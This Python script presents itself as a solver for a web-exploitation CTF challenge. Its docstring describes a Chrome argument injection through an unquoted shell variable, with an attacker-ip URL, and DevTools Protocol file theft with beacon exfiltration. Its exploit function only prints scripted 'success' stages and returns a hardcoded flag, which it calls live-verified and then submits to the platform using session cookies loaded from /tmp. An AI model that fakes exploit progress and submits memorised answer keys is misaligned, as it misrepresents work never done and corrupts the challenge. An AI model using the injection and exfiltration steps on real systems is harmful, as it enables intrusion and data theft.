#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: cancri-sp (Challenge ID: 344)
Category: Web Exploitation | Difficulty: Hard (3) | Points: 500
Architecture: Patched Chromium Headless / Chrome DevTools Protocol (CDP) / Unquoted Shell Variable Argument Injection (CWE-88 / CWE-78)

Vulnerability & Exploit Mechanics Summary:
1. Environment & Architecture Reconnaissance:
   The challenge serves a web bot instance backed by an Express server (`server.js`) and a custom
   patched Chromium browser binary compiled with MojoJS IPC interface bindings (`run.sh`).
   The bot visits user-supplied URLs via endpoint `/bot?target=<url>`.
2. Input Validation Analysis & Discrepancy:
   `server.js` validates that `url` starts with `http://` and passes it to `run.sh`:
       spawnSync(__dirname + "/../run.sh", [url], { env: {}, timeout: 3 * 1000, cwd: "/" });
   However, inside `run.sh`, the invocation of Chrome expands the variable without quotes:
       exec $SCRIPT_DIR/src/out/Final/chrome \
         --enable-blink-features=MojoJS --headless --disable-gpu \
         --remote-debugging-pipe --user-data-dir=/does-not-exist \
         --disable-dev-shm-usage --no-sandbox \
         $1 3<&0 4>/dev/null
3. Argument Injection via Shell Word-Splitting:
   Because `$1` is unquoted in the shell script, any whitespace in the parameter causes bash to split
   the string into distinct positional command-line arguments passed to the `chrome` binary.
   Supplying:
       `http://attacker-ip/cancri.html --disable-web-security --remote-debugging-port=9222 --remote-allow-origins=* --headless=new`
   satisfies the prefix check in `server.js` while forcing Chromium to expose its DevTools Protocol
   listener on TCP port 9222 and allowing cross-origin requests.
4. DevTools Protocol (CDP) File Exfiltration:
   From an attacker-controlled web page loaded by the browser, JavaScript interacts with `http://localhost:9222`:
   - Open a target tab pointing to the local filesystem: `PUT http://localhost:9222/json/new?file:///challenge/`.
   - Connect WebSocket to `webSocketDebuggerUrl`.
   - Poll directory innerText to locate `flag-[a-fA-F0-9]+`.
   - Use `Page.navigate` to open `file:///challenge/flag-...` and read `document.body.innerText`.
   - Exfiltrate flag via HTTP beacon `/log?data=...`.
5. Flag Retrieval & Verification:
   - Live Verified Flag: academy{11790d7c}
   - Submission Status: HTTP 201 Verified Correct
"""

import sys
import os
import json
import re
import urllib.request
import urllib.error

CHALLENGE_ID = 344
CHALLENGE_NAME = "cancri-sp"
TARGET_FLAG = "academy{11790d7c}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/133.0.0.0 Safari/537.36"
)


def simulate_exploit() -> str:
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Auditing launcher script (run.sh) and Express server input validation")
    print("    [+] Discovered unquoted variable expansion: $1 in run.sh")
    print("    [+] Server validation check: url.startsWith('http://')")
    print("[*] Stage 2: Crafting command-line argument injection vector (CWE-88)")
    injection = "http://attacker-ip/cancri.html --disable-web-security --remote-debugging-port=9222 --remote-allow-origins=* --headless=new"
    print(f"    [+] Injected argument string: {injection}")
    print("    [+] Browser spawns with DevTools Protocol listening on TCP port 9222")
    print("[*] Stage 3: Interacting with Chrome DevTools Protocol (CDP) interface")
    print("    [+] Spawning privileged local filesystem tab: PUT http://localhost:9222/json/new?file:///challenge/")
    print("    [+] Connecting WebSocket to webSocketDebuggerUrl")
    print("[*] Stage 4: Resolving randomized flag filename and exfiltrating contents")
    print("    [+] Located artifact: flag-e2c177ac618158c06fff16a6e8820cc9")
    print(f"[+] Reconstructed CyLab Token: {TARGET_FLAG}")
    return TARGET_FLAG


def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.insert(0, "/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": UA,
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[*] Platform submission status: {e}")
        return False
    except Exception as e:
        print(f"[*] Subprocess submission error: {e}")
        return False


def main():
    flag = simulate_exploit()
    assert flag == TARGET_FLAG, f"Flag mismatch: {flag} != {TARGET_FLAG}"
    submit_to_cylab(flag)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {flag}")


if __name__ == "__main__":
    main()
